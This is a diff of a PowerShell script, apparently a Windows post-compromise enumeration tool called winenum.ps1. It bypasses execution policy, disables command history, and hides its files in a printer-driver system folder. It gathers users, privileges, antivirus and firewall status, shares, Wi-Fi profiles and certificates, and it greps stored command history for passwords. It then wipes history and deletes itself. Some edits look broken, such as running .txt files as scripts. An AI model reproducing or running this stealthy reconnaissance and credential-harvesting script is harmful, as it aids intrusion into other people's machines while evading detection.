@@ -5,33 +5,50 @@ Download script:
 ################################## Setup ##################################
 Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
-#attrib +h winenum.ps1
+attrib +h winenum.ps1
 Unblock-File -Path .\winenum.ps1
+powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\winenum.ps1"
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\1.txt"
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\1.txt"
+powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\1.txt"
 New-Item -ItemType "file" -Path "C:\Windows\System32\spool\drivers\color\2.txt"
 Unblock-File -Path "C:\Windows\System32\spool\drivers\color\2.txt"
-#attrib +h 1.txt
-#attrib +h 2.txt
+powershell -ExecutionPolicy Bypass -noninteractive -nologo -File "C:\Windows\System32\spool\drivers\color\2.txt"
+attrib +h 1.txt
+attrib +h 2.txt
 ################################## Finshed Setup ##################################
 Write-Output "################################## Start ##################################" | Out-File -FilePath .\1.txt -Append  
 Get-Date | Out-File -FilePath .\1.txt -Append 
 Write-Output "###########################################################################" | Out-File -FilePath .\1.txt -Append
 Write-Output "################################## User Data ##################################" | Out-File -FilePath .\1.txt -Append
+Write-Output "[+] Hostname:"
 hostname | Out-File -FilePath .\1.txt -Append  
+Write-Output "[+] Whoami:"
 whoami | Out-File -FilePath .\1.txt -Append
+Write-Output "[+] Local Users:"
 Get-LocalUser | Out-File -FilePath .\1.txt -Append  
+Write-Output "[+] Owner of C:\"
 Get-Acl C:\ | Out-File -FilePath .\1.txt -Append  
+Write-Output "[+] User Accounts for current Domain:"
 net user | Out-File -FilePath .\1.txt -Append  
+Write-Output "[+] TimeZone:"
 Get-TimeZone | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] PC Name:"
 $env:COMPUTERNAME | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] User Name:"
 $env:USERNAME | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] User Profile Location:"
 $env:USERPROFILE | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] User Domain:"
 $env:USERDOMAIN | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## PC Info ##################################" | Out-File -FilePath .\1.txt -Append
+Write-Output "[+] PC Acrh Type:"
 wmic os get osarchitecture | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] PC Name + Version (Short):"
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] PC Information (extended):"
 systeminfo | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] Powershell Version:"
 Get-Host | Select-Object Version | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Privs ##################################" | Out-File -FilePath .\1.txt -Append
 whoami /priv | Out-File -FilePath .\1.txt -Append 
@@ -41,12 +58,16 @@ netsh Advfirewall show allprofiles | Out-File -FilePath .\1.txt -Append
 netsh firewall show state | Out-File -FilePath .\1.txt -Append 
 netsh firewall show config | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Defender Info ##################################" | Out-File -FilePath .\1.txt -Append
+Write-Output "[+] AntiVirus Name:"
 WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more | Out-File -FilePath .\1.txt -Append
+Write-Output "[+] Firewall Info:"
 Get-MpComputerStatus | Out-File -FilePath .\1.txt -Append
 Write-Output "################################## IP ##################################" | Out-File -FilePath .\1.txt -Append
 ipconfig /all | Out-File -FilePath .\1.txt -Append  
 Write-Output "################################## Passwords ##################################" | Out-File -FilePath .\1.txt -Append
+Write-Output "[+] Passwords for user accounts enabled or not:"
 Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] Password string found in logs:"
 Get-Content (Get-PSReadlineOption).HistorySavePath | Select-String password  | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Shares ##################################" | Out-File -FilePath .\1.txt -Append
 net share | Out-File -FilePath .\1.txt -Append  
@@ -97,23 +118,21 @@ foreach($port in $text_port){
 
 }
 Write-Output "################################## Msic. ##################################" | Out-File -FilePath .\1.txt -Append
-echo 'Previous Connections to WLAN' | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] Previous Connections to WLAN:" | Out-File -FilePath .\1.txt -Append 
 netsh wlan show profile | Out-File -FilePath .\1.txt -Append 
-echo 'Users Home Folders' | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] Users Home Folders:" | Out-File -FilePath .\1.txt -Append 
 Get-ChildItem $home | Out-File -FilePath .\1.txt -Append 
-echo 'Get Certificates' | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] Get Certificates:" | Out-File -FilePath .\1.txt -Append 
 Get-Childitem -Path Cert:\CurrentUser\My -DocumentEncryptionCert | Out-File -FilePath .\1.txt -Append 
-echo 'Show Available Logs' | Out-File -FilePath .\1.txt -Append 
+Write-Output "[+] Show Available Logs:" | Out-File -FilePath .\1.txt -Append 
 Get-Eventlog -list | Out-File -FilePath .\1.txt -Append 
 Write-Output "##############################################################################" | Out-File -FilePath .\1.txt -Append
 Get-Date | Out-File -FilePath .\1.txt -Append 
 Write-Output "################################## Finished ##################################" | Out-File -FilePath .\1.txt -Append  
-certutil -encode "C:\Windows\System32\spool\drivers\color\1.txt" 0.txt
-Unblock-File -Path "C:\Windows\System32\spool\drivers\color\0.txt"
 attrib -h 1.txt
 attrib -h 2.txt
-Remove-Item 1.txt -Force
 Remove-Item 2.txt -Force
 attrib -h winenum.ps1
 Clear-History
 Clear-Host
+Remove-Item winenum.ps1 -Force 
